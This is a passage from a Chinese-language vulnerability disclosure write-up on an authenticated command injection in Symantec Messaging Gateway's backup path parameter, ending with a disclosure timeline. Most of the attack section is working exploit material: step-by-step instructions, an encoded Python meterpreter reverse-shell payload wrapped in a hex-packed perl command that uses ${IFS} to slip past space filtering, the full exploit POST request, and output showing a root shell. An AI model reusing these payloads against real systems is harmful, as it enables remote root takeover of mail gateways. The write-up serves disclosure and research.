          {
            exceptionMsgKeys.add("error.backup.host.port.empty");
            focusElement = "remoteBackupPort";
          }
          else if (!TcpUdpPortValidator.getInstance().isValid(port))
          {
            exceptionMsgKeys.add("error.backup.host.port.invalid");
            focusElement = "remoteBackupPort";
          }
          String path = backupForm.get("remoteBackupPath").toString();
          if (EmptyValidator.getInstance().isValid(path))
          {
            exceptionMsgKeys.add("error.backup.path.empty");
            focusElement = "remoteBackupPath";
          }
          else
          {
            UsAsciiValidator v = UsAsciiValidator.getInstance();
            if (!v.isValid(path))
            {
              exceptionMsgKeys.add("error.backup.path.only.ascii.allowed");
              focusElement = "remoteBackupPath";
            }
          }
        }
验证过程使用了如下规则：
1、remoteBackupAddress不能为空。
2、remoteBackupAddress必须为可路由的IP地址。
3、端口（port）不能为空。
4、端口必须为有效的TCP和UDP端口。
5、路径（path）不能为空。
6、路径必须是ASCII字符串。
因此我们显然可以通过path参数实现命令注入。
**4.4 完成攻击任务**
我们可以通过以下步骤完成命令注入攻击任务。
1、使用有效凭证登陆应用。
2、转到“/brightmail/admin/backup/backupNow.do”。
3、选择“Store backup on a remote location”选项。
4、选择协议类型为SCP。
5、填入某个有效的SSH服务所对应的IP地址、端口信息。（你可以使用kali系统搭建这个服务）。
6、启用“Requires authentication”功能。
7、填入SSH服务所对应的用户名及密码信息。
8、将攻击载荷放在tmp参数上。不要忘了使用“$()”或者““”，这样才能执行命令注入攻击。
在我的测试过程中，我发现在载荷中使用空格符（SPACE）会导致某些环节崩溃，你可以使用$IFS来替换空格符。
**4.5 PoC**
我喜欢使用meterpreter，总是倾向于获取一个meterpreter shell，不喜欢获取cmd
shell。我用来获取python版meterpreter的技巧如下。
首先，使用msfvenom来生成python版的载荷。
    msfvenom -p python/meterpreter/reverse_tcp LHOST=12.0.0.1 LPORT=8081 -f raw
    import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQpzLmNvbm5lY3QoKCcxMi4wLjAuMScsODA4MSkpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoZCx7J3MnOnN9KQo=')))
因此，我需要将载荷传递到python -c
"PAYLOAD"命令中，但应用程序不允许使用空格符，因此我使用的是${IFS}，这样一来，最终的载荷就变成python${IFS}-v${IFS}"PAYLOAD"。但问题在于我们的载荷内部还有一个空格符，位于import以及base64之间，并且${IFS}是Linux可以用的一个小技巧，但对python来说并不适用！
现在是发挥创造力的时间了。我想到了一个主意。我可以使用perl载荷。因为根据我之前的经验，我可以创造一个不带有空格符的perl载荷。因此，我们可以构建一个perl载荷，利用这个载荷执行我们的meterpreter
python载荷。
实现的方法如下：
    cmd = "python -c "#{payload.encoded}""
    final_payload = cmd.to_s.unpack("H*").first
    p = "perl${IFS}-e${IFS}'system(pack(qq,H#{final_payload.length},,qq,#{final_payload},))'"
最终的载荷如下所示：
    perl${IFS}-e${IFS}'system(pack(qq,H732,,qq,707974686f6e202d632022696d706f7274206261736536342c7379733b65786563286261736536342e6236346465636f6465287b323a7374722c333a6c616d62646120623a627974657328622c275554462d3827297d5b7379732e76657273696f6e5f696e666f5b305d5d28276157317762334a3049484e765932746c6443787a64484a315933514b637a317a62324e725a5851756332396a613256304b4449736332396a613256304c6c4e5051307466553152535255464e4b51707a4c6d4e76626d356c5933516f4b4363784d6934774c6a41754d5363734e4451304e436b70436d77396333527964574e304c6e56756347466a6179676e506b6b6e4c484d75636d566a646967304b536c624d46304b5a44317a4c6e4a6c5933596f62436b4b6432687062475567624756754b4751705047773643676c6b4b7a317a4c6e4a6c5933596f624331735a57346f5a436b70436d56345a574d6f5a4378374a334d6e4f6e4e394b516f3d2729292922,))')
这是一个包含python版meterpreter载荷的perl载荷。现在是时候搞定shell了。我向服务器以HTTP方式发送如下POST请求，成功触发了漏洞：
    POST /brightmail/admin/backup/performBackupNow.do HTTP/1.1
    Host: 12.0.0.199:8443
    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 1188
    Referer: https://12.0.0.199:8443/brightmail/admin/backup/backupNow.do
    Cookie: JSESSIONID=67376D92B987724ED2309C86990690E3; userLanguageCode=en; userCountryCode=US; navState=expanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded%2Cexpanded; JSESSIONID=0360B579A58BBBB8D74FEE4767BCAC10
    Connection: close
    Upgrade-Insecure-Requests: 1
    pageReuseFor=backup_now&id=&symantec.brightmail.key.TOKEN=48f39f735f15fcaccd0aacc40b27a67bf76f2bb1&backupData=full&customType=configuration&includeIncidentMessages=true&includeReportData=true&includeLogData=true&backupTo=2&remoteBackupProtocol=SCP&remoteBackupAddress=127.0.0.1&remoteBackupPort=22&remoteBackupPath=tmp$(perl${IFS}-e${IFS}'system(pack(qq,H732,,qq,707974686f6e202d632022696d706f7274206261736536342c7379733b65786563286261736536342e6236346465636f6465287b323a7374722c333a6c616d62646120623a627974657328622c275554462d3827297d5b7379732e76657273696f6e5f696e666f5b305d5d28276157317762334a3049484e765932746c6443787a64484a315933514b637a317a62324e725a5851756332396a613256304b4449736332396a613256304c6c4e5051307466553152535255464e4b51707a4c6d4e76626d356c5933516f4b4363784d6934774c6a41754d5363734e4451304e436b70436d77396333527964574e304c6e56756347466a6179676e506b6b6e4c484d75636d566a646967304b536c624d46304b5a44317a4c6e4a6c5933596f62436b4b6432687062475567624756754b4751705047773643676c6b4b7a317a4c6e4a6c5933596f624331735a57346f5a436b70436d56345a574d6f5a4378374a334d6e4f6e4e394b516f3d2729292922,))')&requiresRemoteAuthentication=true&remoteBackupUsername=root&remoteBackupPassword=qwe123
漏洞触发过程如下所示：
    msf exploit(handler) > run
    [*] Started reverse TCP handler on 12.0.0.1:4444 
    [*] Starting the payload handler...
    [*] Sending stage (39842 bytes) to 12.0.0.199
    [*] Meterpreter session 2 opened (12.0.0.1:4444 -> 12.0.0.199:54077) at 2017-04-30 17:03:26 +0300
    meterpreter > shell
    Process 15849 created.
    Channel 1 created.
    sh: no job control in this shell
    sh-4.1# id
    uid=0(root) gid=0(root) groups=0(root)
    sh-4.1#
我们在Symantec Messaging
Gateway上获取了一个root权限的shell，然后继续渗透测试旅程。然而我不能与大家分享我们后续的渗透过程，因为这一过程包含客户的敏感信息。
**4.6 Metasploit模块**
我同样实现了一个metasploit模块，该模块的工作过程如下所示（gif动图）：
大家可以通过[此链接](https://github.com/rapid7/metasploit-framework/pull/8540)获取这个模块。
**五、时间线**
2017年4月24日：发现漏洞
2017年4月24日：在没有获得厂商支持的前提下，我们向PRODAFT GPACT成员们共享了漏洞的细节及应急补救方法。
2017年4月26日：第一次与厂商接触。
2017年5月2日：Symantec产品团队确认漏洞有效。
2017年5月25日：我们请求漏洞相关的更新信息。
2017年5月25日：Symantec回复说他们已经准备在6月份发布补丁，补丁发布时会通知我们。
2017年6月8日：我们的客户通知我们他们已经收到厂商的[更新通知](https://support.symantec.com/en_US/article.ALERT2377.html)。看样子Symantec在没有通知我们的前提下，就发布了10.6.3版本的更新版本，也没有通知我们对补丁有效性进行确认。
2017年6月10日：漏洞细节向公众公布。